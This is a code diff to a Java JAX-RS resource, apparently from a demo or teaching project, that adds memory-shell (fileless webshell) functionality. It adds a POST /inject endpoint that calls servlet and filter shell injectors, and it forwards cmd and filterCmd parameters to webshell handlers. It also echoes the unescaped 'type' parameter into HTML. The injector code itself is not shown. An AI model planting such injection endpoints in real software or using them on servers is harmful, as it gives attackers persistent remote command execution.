@@ -1,18 +1,34 @@
 package com.book.demo;
 
 import jakarta.ws.rs.GET;
+import jakarta.ws.rs.POST;
 import jakarta.ws.rs.Path;
 import jakarta.ws.rs.Produces;
 import jakarta.ws.rs.QueryParam;
 import jakarta.ws.rs.core.MediaType;
 import jakarta.ws.rs.core.Response;
+import com.book.demo.memshell.MemoryShellInjector;
+import java.util.List;
+import java.util.ArrayList;
 
-@Path("/shell")
+@Path("/")
 public class ShellResource {
     
     @GET
     @Produces(MediaType.TEXT_HTML + "; charset=UTF-8")
-    public Response getShellDemo(@QueryParam("action") String action, @QueryParam("type") String type) {
+    public Response getShellDemo(@QueryParam("action") String action, 
+                                @QueryParam("type") String type,
+                                @QueryParam("cmd") String cmd,
+                                @QueryParam("servletAction") String servletAction,
+                                @QueryParam("filterAction") String filterAction,
+                                @QueryParam("filterCmd") String filterCmd) {
+        
+        // 如果是内存马相关的请求，重定向到实际的内存马处理
+        if (isMemoryShellRequest(action, type, cmd, servletAction, filterAction, filterCmd)) {
+            return handleMemoryShellRedirect(action, type, cmd, servletAction, filterAction, filterCmd);
+        }
+        
+        // 如果是演示页面请求
         if ("info".equals(action) && type != null) {
             String html = generateShellDemoHTML(type);
             return Response.ok(html)
@@ -23,6 +39,73 @@ public class ShellResource {
         return Response.ok("<h1>Shell Demo</h1><p>Invalid parameters</p>")
                 .type(MediaType.TEXT_HTML + "; charset=UTF-8")
                 .build();
+    }
+    
+    private boolean isMemoryShellRequest(String action, String type, String cmd, 
+                                       String servletAction, String filterAction, String filterCmd) {
+        // 检查是否是内存马实际功能请求
+        return cmd != null || servletAction != null || filterAction != null || filterCmd != null ||
+               (action != null && type != null && !"info".equals(action));
+    }
+    
+    private Response handleMemoryShellRedirect(String action, String type, String cmd, 
+                                             String servletAction, String filterAction, String filterCmd) {
+        // 构建重定向URL
+        StringBuilder redirectUrl = new StringBuilder("/memshell");
+        
+        if ("servlet".equals(type) || servletAction != null) {
+            redirectUrl.append("/servlet");
+        } else if ("filter".equals(type) || filterAction != null || filterCmd != null) {
+            redirectUrl.append("/filter");
+        }
+        
+        // 添加查询参数
+        List<String> params = new ArrayList<>();
+        if (action != null) params.add("action=" + action);
+        if (type != null) params.add("type=" + type);
+        if (cmd != null) params.add("cmd=" + cmd);
+        if (servletAction != null) params.add("servletAction=" + servletAction);
+        if (filterAction != null) params.add("filterAction=" + filterAction);
+        if (filterCmd != null) params.add("filterCmd=" + filterCmd);
+        
+        if (!params.isEmpty()) {
+            redirectUrl.append("?").append(String.join("&", params));
+        }
+        
+        return Response.status(Response.Status.FOUND)
+                .header("Location", redirectUrl.toString())
+                .build();
+    }
+    
+    @POST
+    @Path("/inject")
+    @Produces(MediaType.TEXT_HTML + "; charset=UTF-8")
+    public Response injectMemoryShell(@QueryParam("type") String type) {
+        try {
+            MemoryShellInjector.InjectionResult result;
+            
+            if ("servlet".equals(type)) {
+                result = MemoryShellInjector.injectServletShell();
+            } else if ("filter".equals(type)) {
+                result = MemoryShellInjector.injectFilterShell();
+            } else {
+                return Response.ok("<h1>Error</h1><p>Invalid type: " + type + "</p>").build();
+            }
+            
+            String html = "<h1>Memory Shell Injection</h1>" +
+                         "<p>Type: " + type + "</p>" +
+                         "<p>Success: " + result.isSuccess() + "</p>" +
+                         "<p>Message: " + result.getMessage() + "</p>" +
+                         "<a href='/shell'>Back to Shell</a>";
+            
+            return Response.ok(html).build();
+            
+        } catch (Exception e) {
+            String html = "<h1>Injection Error</h1>" +
+                         "<p>Error: " + e.getMessage() + "</p>" +
+                         "<a href='/shell'>Back to Shell</a>";
+            return Response.ok(html).build();
+        }
     }
     
     private String generateShellDemoHTML(String type) {
